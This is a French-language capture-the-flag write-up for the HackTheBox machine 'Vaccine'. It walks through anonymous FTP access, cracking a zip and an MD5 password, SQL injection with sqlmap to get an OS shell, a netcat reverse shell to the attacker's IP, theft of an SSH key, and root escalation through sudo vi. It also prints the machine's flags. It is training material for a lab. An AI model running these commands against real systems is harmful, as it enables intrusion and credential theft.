# Write-up — HackTheBox : Vaccine

Write-up réalisé pour la machine Vaccine de HackTheBox. L'objectif est d'enchaîner plusieurs techniques : accès FTP anonyme, crack de mot de passe, injection SQL pour obtenir un shell, et escalade de privilèges via un binaire autorisé en sudo qui peut être détourné pour spawner un shell root.

L'IP de la machine pendant ma session était `10.129.95.174`.

---

## 1. Scan des ports ouverts

```bash
nmap -sV -sS 10.129.95.174
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

En plus de SSH (22) et HTTP (80), on trouve un service **FTP** sur le port 21.

---

## 2. Connexion FTP anonyme

FTP peut être configuré pour autoriser une connexion sans mot de passe via le nom d'utilisateur **`anonymous`**. C'est une fonctionnalité volontairement permissive, souvent activée pour des serveurs de distribution publique, et fréquemment laissée ouverte par erreur en environnement de production.

---

## 3. Récupération du fichier via FTP

On se connecte en anonyme et on liste le contenu du serveur :

```bash
ftp 10.129.95.174
```

```
Name: Anonymous
Password: [vide]
230 Login successful.

ftp> ls
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip

ftp> get backup.zip
226 Transfer complete. 2533 bytes received.
```

Le seul fichier présent est **`backup.zip`**, qu'on récupère en local.

---

## 4. Génération du hash avec zip2john

En essayant de décompresser l'archive, on se retrouve bloqué par un mot de passe :

```bash
unzip backup.zip
```

```
[backup.zip] index.php password:
   skipping: index.php               incorrect password
   skipping: style.css               incorrect password
```

Pour cracker ce mot de passe avec John The Ripper, il faut d'abord extraire le hash de l'archive dans un format que John peut attaquer. C'est le rôle de **`zip2john`** :

```bash
zip2john backup.zip > backup.john
```

---

## 5. Crack du mot de passe admin

On lance John The Ripper sur le hash généré avec la wordlist `rockyou.txt` :

```bash
john -w=/usr/share/wordlists/rockyou.txt backup.john
```

```
741852963        (backup.zip)
1g 0:00:00:00 DONE
Session completed.
```

Le mot de passe de l'archive est **`741852963`**. On décompresse :

```bash
unzip backup.zip
# [backup.zip] index.php password: 741852963
#   inflating: index.php
#   inflating: style.css
```

En lisant `index.php`, on trouve la logique d'authentification de l'interface web :

```php
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")
```

Le mot de passe de l'admin est stocké sous forme de hash MD5. On le soumet à [crackstation.net](https://crackstation.net/) :

```
2cb42f8734ea607eefed3b70af13bbd3  →  md5  →  qwerty789
```

**Credentials admin :** `admin` / `qwerty789`

---

## 6. Injection SQL avec sqlmap, option `--os-shell`

On se connecte à l'interface web avec les credentials trouvés. Le dashboard expose une barre de recherche dont la valeur est directement intégrée dans l'URL :

```
http://10.129.95.174/dashboard.php?search=
```

C'est un vecteur classique d'injection SQL. On utilise `sqlmap` pour l'exploiter. L'option qui permet d'obtenir une exécution de commandes OS via l'injection est **`--os-shell`** :

```bash
sqlmap -u "http://10.129.95.174/dashboard.php?search=Petrol" --os-shell \
    --cookie="PHPSESSID=vsrp78ei4fa2954pu4cqtusqlg"
```

Le cookie de session est obligatoire ici : sans lui, sqlmap arriverait sur la page de login et ne verrait pas le paramètre vulnérable. On le récupère via Cookie Editor après s'être connecté en tant qu'admin.

---

## 7. Escalade de privilèges : `vi` autorisé en sudo

Le shell obtenu via `--os-shell` est limité. On l'upgrade en reverse shell bash depuis la cible :

```bash
os-shell> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.30 4444 >/tmp/f
```

Avec le listener ouvert sur notre machine (`nc -lvnp 4444`), on obtient un shell interactif en tant que `postgres`. On stabilise :

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

En fouillant le home de postgres, on trouve une clé SSH privée dans `.ssh/id_rsa`. On la copie en local pour avoir une connexion SSH stable, qui ne dépend plus de sqlmap :

```bash
chmod 600 id_rsa.key
ssh -i id_rsa.key postgres@10.129.95.174
```

On veut maintenant vérifier les droits sudo de postgres avec `sudo -l`, mais la commande demande son mot de passe. Le hash trouvé via sqlmap (`--password`) ne fonctionne pas. En lisant `dashboard.php` sur le serveur, on trouve la chaîne de connexion à la base en clair :

```php
pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

Le mot de passe système de postgres est réutilisé pour la base : **`P@s5w0rd!`**. On relance `sudo -l` :

```
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

postgres peut lancer **`vi`** en root sur un fichier de configuration spécifique. C'est suffisant pour escalader : depuis vi, la commande `:shell` ouvre un shell avec les droits du processus vi, soit root. Cette technique est référencée sur [GTFOBins](https://gtfobins.github.io/gtfobins/vi/).

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Une fois dans vi :

```
:shell
```

On obtient un shell root.

---

## 8. Flag user

Le flag utilisateur se trouve dans le home de postgres :

```bash
postgres@vaccine:~$ cat user.txt
```

**Flag user :** `ec9b13ca4d6229cd5cc1e09980965bf7`

---

## 9. Flag root

Depuis le shell root obtenu via vi :

```bash
root@vaccine:/var/lib/postgresql# cat /root/root.txt
```

**Flag root :** `dd6e058e814260bc70e9bbdef2715849`
